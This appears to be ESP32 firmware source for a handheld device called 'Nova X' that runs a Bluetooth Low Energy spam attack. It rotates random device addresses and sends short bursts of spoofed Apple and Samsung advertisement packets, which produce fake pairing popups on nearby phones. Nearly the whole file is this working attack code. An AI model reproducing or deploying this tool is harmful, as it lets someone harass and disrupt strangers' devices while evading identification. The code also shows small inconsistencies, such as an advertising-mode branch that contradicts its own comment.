#include "bt.h"

void nx::bt::init(){
  NimBLEDevice::init("Nova X");
  NimBLEDevice::setPower(ESP_PWR_LVL_P20);
  btServerPtr = NimBLEDevice::createServer();
  advPtr = NimBLEDevice::getAdvertising();
}

void nx::bt::addrReset(){
  for (int i = 0; i < 6; i++){
    dummyAddr[i] = random(256);
    if (i == 0) dummyAddr[i] |= 0xC0; // Random static address
  }
}

void nx::bt::advTypeSet(){
  int advTypeIdx = random(3);
  
  switch(advTypeIdx){
    case 0: 
      // ADV_IND - Connectable and scannable
      advPtr->setConnectableMode(BLE_GAP_CONN_MODE_UND);
      advPtr->setScanFilter(false, false); // scan req from any, conn req from any
      break;
    case 1: 
      // ADV_SCAN_IND - Scannable but not connectable
      advPtr->setConnectableMode(BLE_GAP_CONN_MODE_NON);
      advPtr->setScanFilter(false, false);
      break;
    case 2: 
      // ADV_NONCONN_IND - Non-connectable and non-scannable
      // advPtr->setConnectableMode(BLE_GAP_CONN_MODE_NON);
      // advPtr->setScanFilter(true, true); // no scan, no connect
      advPtr->setConnectableMode(BLE_GAP_CONN_MODE_UND);
      advPtr->setScanFilter(false, false); // scan req from any, conn req from any
      break;
  }
  
  // advPtr->setMinInterval(0x20);
  // advPtr->setMaxInterval(0x40);
  
  addrReset();
  NimBLEDevice::setOwnAddrType(BLE_OWN_ADDR_RANDOM);
  ble_hs_id_set_rnd(dummyAddr);
  
  advPtr->start();
}

void nx::bt:: iosAdv(){
  addrReset();
  
  int deviceIdx = random(2);
  int dataIdx;
  uint8_t* deviceData;
  uint8_t deviceLen;
  
  switch(deviceIdx){
    case 0: 
      dataIdx = random(17); 
      deviceData = (uint8_t*)DEVICES[dataIdx];
      deviceLen = 31;
      break;
    case 1: 
      dataIdx = random(13); 
      deviceData = (uint8_t*)DEVICES[dataIdx];
      deviceLen = 23;
      break;
  }
  
  NimBLEDevice::setOwnAddrType(BLE_OWN_ADDR_RANDOM);
  ble_hs_id_set_rnd(dummyAddr);
  
  NimBLEAdvertisementData advData;
  advData.addData(deviceData, deviceLen);
  
  advPtr->setAdvertisementData(advData);
  advPtr->start();
  delay(15);
  advPtr->stop();
}

void nx::bt::samsungAdv(){
  addrReset();
  
  int deviceIdx = random(26);
  uint8_t model = watch[deviceIdx].value;
  uint8_t advDataRaw[15];
  int i = 0;
  advDataRaw[i++] = 14; // Size
  advDataRaw[i++] = 0xFF; // AD Type (Manufacturer Specific)
  advDataRaw[i++] = 0x75; // Company ID (Samsung Electronics Co.Ltd.)
  advDataRaw[i++] = 0x00; // ... 
  advDataRaw[i++] = 0x01;
  advDataRaw[i++] = 0x00;
  advDataRaw[i++] = 0x02;
  advDataRaw[i++] = 0x00;
  advDataRaw[i++] = 0x01;
  advDataRaw[i++] = 0x01;
  advDataRaw[i++] = 0xFF;
  advDataRaw[i++] = 0x00;
  advDataRaw[i++] = 0x00;
  advDataRaw[i++] = 0x43;
  advDataRaw[i++] = (model >> 0x00) & 0xFF; // Watch Model / Color (?)
  

  NimBLEDevice::setOwnAddrType(BLE_OWN_ADDR_RANDOM);
  ble_hs_id_set_rnd(dummyAddr);
  NimBLEAdvertisementData advData;
  advData.addData(advDataRaw, LEN);
  
  advPtr->setAdvertisementData(advData);
  advPtr->start();
  delay(15);
  advPtr->stop();
}